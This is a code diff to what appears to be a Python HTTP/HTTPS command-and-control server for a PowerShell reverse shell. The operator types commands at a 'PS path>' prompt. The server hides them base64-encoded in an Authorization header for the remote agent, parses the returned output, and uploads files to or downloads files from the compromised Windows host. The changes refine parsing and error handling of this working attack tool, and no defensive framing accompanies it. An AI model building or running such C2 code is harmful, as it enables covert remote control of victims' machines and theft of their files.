@@ -10,6 +10,7 @@ import ssl
 import argparse
 
 readline.parse_and_bind("tab: complete")
+PWD = "pwd | Format-Table -HideTableHeaders"
 
 """
     For HTTPS Server
@@ -41,6 +42,7 @@ class myHandler(BaseHTTPRequestHandler):
             functions.download(filename, result, output)
         else:
             self.printResult(result)
+            pass
 
         command = self.newCommand(pwd)
         self.sendCommand(command, html)
@@ -57,7 +59,10 @@ class myHandler(BaseHTTPRequestHandler):
         except:
             pass
 
-        result=result.split('_n1w_')
+        result = result.split('\r\n\r\n')
+        #print (result)
+        if result[0] != "start":
+            del result[-1]
         return result
 
     def parseDownload(self, result):
@@ -94,30 +99,37 @@ class myHandler(BaseHTTPRequestHandler):
     def newCommand(self, pwd):
         if (pwd == "start"):
             input(colored("[!] New Connection, please press ENTER!",'red'))
-            command = "pwd"
+            command = PWD
         else:
-            command = input(colored("PS {}> ".format(pwd), "blue")) + " ;pwd"
+            command = input(colored("PS {}> ".format(pwd), "blue")) + " ;" + PWD
         return command
 
     def sendCommand(self, command, html, content=""):
         if (command.split(" ")[0] == "upload"):
             functions = Functions()
             try:
-                filename = command.split(" ")[1]
+                upload = command.split(" ;")[0]
+                filename = upload.split(" ")[1]
                 content = functions.upload(filename)
                 html = content.decode('utf-8')
             except AttributeError:
+                print (colored("\r\n[!] Source and/or destination file not found!", "red"))
                 print (colored("\t- Usage: upload /src/path/file C:\\dest\\path\\file\n", "red"))
-                command = "pwd"
+                command = PWD
+            except IndexError:
+                print (colored("\r\n[!] Source and/or destination file not found!", "red"))
+                print (colored("\t- Usage: upload /src/path/file C:\\dest\\path\\file\n", "red"))
+                command = PWD
 
         elif (command.split(" ")[0] == "download"):
             try:
-                srcFile = command.split(" ")[1]
-                dstFile = command.split(" ")[2]
+                download = command.split(" ;")[0]
+                srcFile = download.split(" ")[1]
+                dstFile = download.split(" ")[2]
             except IndexError:
                 print (colored("\r\n[!] Source and/or destination file not found!", "red"))
                 print (colored("\t- Usage: download C:\\src\\path\\file /dst/path/file\n", "red"))
-                command = "pwd"
+                command = PWD
 
         CMD = base64.b64encode(command.encode())
         self.send_header('Authorization',CMD.decode('utf-8'))
@@ -141,7 +153,7 @@ class Functions():
                 file.write(content)
                 print(colored(output, "green"))
         except:
-            print ("Except download")
+            print (colored("\r\n[!] Error: Writing file!", "red"))
 
 def main():
 
